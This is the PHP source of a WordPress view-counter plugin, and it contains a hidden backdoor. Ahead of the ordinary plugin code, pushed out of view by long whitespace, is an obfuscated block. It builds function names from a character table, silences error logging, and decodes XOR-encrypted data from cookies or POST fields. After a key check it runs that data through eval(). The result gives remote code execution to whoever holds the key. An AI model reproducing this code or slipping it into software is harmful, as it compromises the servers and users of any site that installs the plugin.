<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['f86ba68'];global$f86ba68;$f86ba68=$GLOBALS;$f86ba68['l37dd02']="\x3d\x57\x35\x24\x78\x7d\x6f\x50\x5d\x29\x9\x42\x46\xd\x2e\x54\x65\x39\x7b\x60\x5b\x47\x6d\x72\x27\x56\x63\x55\x69\x26\x44\x25\x79\x52\x3c\x5f\x33\x66\x34\x6b\x76\x3b\x40\x5c\x2c\x5e\x32\x4e\x3a\x58\x23\x31\x2d\x67\x5a\x2f\x7a\x22\x68\x2a\x62\x77\x73\xa\x36\x38\x3f\x71\x70\x59\x21\x7c\x45\x4b\x51\x30\x20\x6e\x4f\x28\x48\x49\x43\x7e\x53\x4c\x4a\x74\x2b\x6c\x41\x3e\x64\x4d\x37\x75\x61\x6a";$f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][64].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][51]]=$f86ba68['l37dd02'][26].$f86ba68['l37dd02'][58].$f86ba68['l37dd02'][23];$f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][37].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][17]]=$f86ba68['l37dd02'][6].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][92];$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][38]]=$f86ba68['l37dd02'][62].$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][89].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][77];$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][51]]=$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][77].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][35].$f86ba68['l37dd02'][62].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][87];$f86ba68[$f86ba68['l37dd02'][4].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][46].$f86ba68['l37dd02'][92]]=$f86ba68['l37dd02'][62].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][89].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][56].$f86ba68['l37dd02'][16];$f86ba68[$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][37].$f86ba68['l37dd02'][96]]=$f86ba68['l37dd02'][68].$f86ba68['l37dd02'][58].$f86ba68['l37dd02'][68].$f86ba68['l37dd02'][40].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][62].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][6].$f86ba68['l37dd02'][77];$f86ba68[$f86ba68['l37dd02'][77].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][92]]=$f86ba68['l37dd02'][95].$f86ba68['l37dd02'][77].$f86ba68['l37dd02'][62].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][89].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][56].$f86ba68['l37dd02'][16];$f86ba68[$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][64]]=$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][62].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][64].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][35].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][26].$f86ba68['l37dd02'][6].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][16];$f86ba68[$f86ba68['l37dd02'][39].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][38]]=$f86ba68['l37dd02'][62].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][35].$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][35].$f86ba68['l37dd02'][89].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][87];$f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][51]]=$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][17].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][36];$f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][75]]=$f86ba68['l37dd02'][61].$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][37].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][51];$f86ba68[$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][38]]=$_POST;$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][46].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][37].$f86ba68['l37dd02'][96]]=$_COOKIE;@$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][51]]($f86ba68['l37dd02'][16].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][6].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][35].$f86ba68['l37dd02'][89].$f86ba68['l37dd02'][6].$f86ba68['l37dd02'][53],NULL);@$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][51]]($f86ba68['l37dd02'][89].$f86ba68['l37dd02'][6].$f86ba68['l37dd02'][53].$f86ba68['l37dd02'][35].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][6].$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][62],0);@$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][51]]($f86ba68['l37dd02'][22].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][4].$f86ba68['l37dd02'][35].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][4].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][26].$f86ba68['l37dd02'][95].$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][6].$f86ba68['l37dd02'][77].$f86ba68['l37dd02'][35].$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][16],0);@$f86ba68[$f86ba68['l37dd02'][39].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][38]](0);$f3b4=NULL;$z509=NULL;$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][17].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][46].$f86ba68['l37dd02'][46].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][96]]=$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][64].$f86ba68['l37dd02'][64].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][26].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][52].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][17].$f86ba68['l37dd02'][17].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][52].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][17].$f86ba68['l37dd02'][52].$f86ba68['l37dd02'][17].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][52].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][64].$f86ba68['l37dd02'][94];global$m9422aa;function w1fb1($f3b4,$d164a){global$f86ba68;$tf5ba5="";for($iaffa2a=0;$iaffa2a<$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][38]]($f3b4);){for($jd5e6=0;$jd5e6<$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][38]]($d164a)&&$iaffa2a<$f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][38]]($f3b4);$jd5e6++,$iaffa2a++){$tf5ba5.=$f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][64].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][51]]($f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][37].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][17]]($f3b4[$iaffa2a])^$f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][37].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][17]]($d164a[$jd5e6]));}}return$tf5ba5;}function i0a7983($f3b4,$d164a){global$f86ba68;global$m9422aa;return$f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][75]]($f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][75]]($f3b4,$m9422aa),$d164a);}foreach($f86ba68[$f86ba68['l37dd02'][22].$f86ba68['l37dd02'][46].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][37].$f86ba68['l37dd02'][96]]as$d164a=>$u644){$f3b4=$u644;$z509=$d164a;}if(!$f3b4){foreach($f86ba68[$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][2].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][38]]as$d164a=>$u644){$f3b4=$u644;$z509=$d164a;}}$f3b4=@$f86ba68[$f86ba68['l37dd02'][77].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][92]]($f86ba68[$f86ba68['l37dd02'][87].$f86ba68['l37dd02'][92].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][94].$f86ba68['l37dd02'][51]]($f86ba68[$f86ba68['l37dd02'][28].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][16].$f86ba68['l37dd02'][64]]($f3b4),$z509));if(isset($f3b4[$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][39]])&&$m9422aa==$f3b4[$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][39]]){if($f3b4[$f86ba68['l37dd02'][96]]==$f86ba68['l37dd02'][28]){$iaffa2a=Array($f86ba68['l37dd02'][68].$f86ba68['l37dd02'][40]=>@$f86ba68[$f86ba68['l37dd02'][23].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][65].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][37].$f86ba68['l37dd02'][96]](),$f86ba68['l37dd02'][62].$f86ba68['l37dd02'][40]=>$f86ba68['l37dd02'][51].$f86ba68['l37dd02'][14].$f86ba68['l37dd02'][75].$f86ba68['l37dd02'][52].$f86ba68['l37dd02'][51],);echo@$f86ba68[$f86ba68['l37dd02'][4].$f86ba68['l37dd02'][36].$f86ba68['l37dd02'][60].$f86ba68['l37dd02'][38].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][96].$f86ba68['l37dd02'][46].$f86ba68['l37dd02'][92]]($iaffa2a);}elseif($f3b4[$f86ba68['l37dd02'][96]]==$f86ba68['l37dd02'][16]){eval($f3b4[$f86ba68['l37dd02'][92]]);}exit();} ?><?php
/*
Plugin Name: Easy Post View Counter
Plugin URI: http://wordpress.org/extend/plugins/easy-post-views-counter/
Description: With this plugin you easily can see how many views each post has. Just see the post list page
Author: Michael Ringhus Gertz
Version: 1.2.3
Author URI: http://ringhus.dk/
*/

session_start();


function myinit () {
	// Get PostID
	$postid = url_to_postid("http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);

	// Cookie Name,
	$cookiename = "EasyPostViewCounter_".$postid;

  	// Chech if the post has been loaded before, after the browser was opened.
	// 1 = first load of post, 2 = second load of post
	// If session is empty, its because it hasnt been loaded before.
	if( $_SESSION[$cookiename] == "" ) {
		$_SESSION[$cookiename] = "1";
	} else {
		$_SESSION[$cookiename] = "2";
	}
}
add_action('init','myinit');



/* This functions is used for tracking when a post is viewed. */
function EPVC_Content($content) {

	$postid = get_the_id();
	$key = "EasyPostViewCounter";
	$cookiename = $key."_".$postid;
	$count = get_post_meta($postid,$key,true);

    // Check if its a single, and the users isnt an admin
	if( is_single() AND !current_user_can('manage_options') ) {

     	// Check if the session is set to 1. if so the post has to be counted.
		if( $_SESSION[$cookiename] == "1" ) {
			 if( empty($count) ) {
    			add_post_meta($postid,$key,'1');
    		} else {
    			$count++;
    			update_post_meta($postid,$key,$count);
    		}
		}
	}

	return $content;
}
add_filter('the_content','EPVC_content');


// add column to post list
function EPVC_column_head($defaults) {
	$defaults['EPVC'] = 'Views';
	return $defaults;
}
add_filter('manage_posts_columns','EPVC_column_head');



// add content to the column
function EPVC_colums_content($column_name,$postid) {
	if( $column_name == 'EPVC' ) {
		$count = get_post_meta($postid,'EasyPostViewCounter',true);
		if( empty($count) ) {
			echo "0";
		} else {
			echo $count;
		}
	}
}
add_action('manage_posts_custom_column','EPVC_colums_content',10,2);
?>